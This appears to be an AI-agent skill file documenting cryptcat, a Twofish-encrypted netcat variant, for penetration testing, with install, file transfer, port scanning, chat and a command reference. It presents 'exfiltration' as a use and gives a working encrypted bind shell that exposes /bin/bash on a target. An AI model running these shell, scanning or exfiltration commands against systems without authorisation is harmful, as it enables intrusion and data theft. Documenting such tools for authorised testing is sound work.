---
name: cryptcat
description: Establish encrypted TCP or UDP network connections for data transfer, port scanning, and remote shell access. Use when a secure, Twofish-encrypted alternative to netcat is required for reconnaissance, exfiltration, or creating simple encrypted listeners during penetration testing.
---

# cryptcat

## Overview
Cryptcat is a lightweight network utility that reads and writes data across network connections using TCP or UDP, similar to netcat (nc), but with the addition of Twofish encryption. It serves as a feature-rich tool for network debugging, exploration, and secure data transmission. Category: Sniffing & Spoofing / Information Gathering.

## Installation (if not already installed)
Assume cryptcat is already installed. If the command is missing:

```bash
sudo apt install cryptcat
```

## Common Workflows

### Encrypted File Transfer
On the receiving server (listener):
```bash
cryptcat -l -p 4444 -n > received_file
```
On the sending client:
```bash
cryptcat 192.168.1.202 4444 < file_to_send
```

### Encrypted Port Scanning
Scan a range of ports (1-1024) on a target without sending data:
```bash
cryptcat -v -z -n 192.168.1.202 1-1024
```

### Simple Encrypted Chat
On machine A:
```bash
cryptcat -l -p 5555
```
On machine B:
```bash
cryptcat <IP_OF_A> 5555
```

### Creating an Encrypted Bind Shell
On the target (listener):
```bash
cryptcat -l -p 4444 -e /bin/bash
```
On the attacker machine:
```bash
cryptcat <TARGET_IP> 4444
```

## Complete Command Reference

### Usage Modes
- **Connect to a host:** `cryptcat [-options] hostname port[s] [ports] ...`
- **Listen for inbound:** `cryptcat -l -p port [-options] [hostname] [port]`

### Options

| Flag | Description |
|------|-------------|
| `-g gateway` | Source-routing hop point[s], up to 8 |
| `-G num` | Source-routing pointer: 4, 8, 12, ... |
| `-h` | Display help and usage information |
| `-i secs` | Delay interval for lines sent and ports scanned |
| `-l` | Listen mode, for inbound connections |
| `-n` | Numeric-only IP addresses, no DNS resolution |
| `-o file` | Hex dump of traffic to a specified file |
| `-p port` | Local port number |
| `-r` | Randomize local and remote ports |
| `-s addr` | Local source address |
| `-u` | UDP mode (default is TCP) |
| `-v` | Verbose output (use twice `-vv` for more detail) |
| `-w secs` | Timeout for connects and final net reads |
| `-z` | Zero-I/O mode (used for scanning) |

### Port Specification
Port numbers can be individual or ranges: `lo-hi` (inclusive).

## Notes
- **Encryption:** Cryptcat uses Twofish encryption. Both ends of the connection must use cryptcat to successfully decrypt the traffic.
- **Password:** By default, cryptcat uses a hardcoded password. To change the password, you typically need to set the environment variable `CRYPTCAT_PASSWORD` or use the `-k` flag if supported by your specific build (though not listed in the standard Kali help output provided).
- **Security:** While encrypted, cryptcat does not provide the same level of authentication or forward secrecy as modern tools like SSH or TLS-wrapped sockets.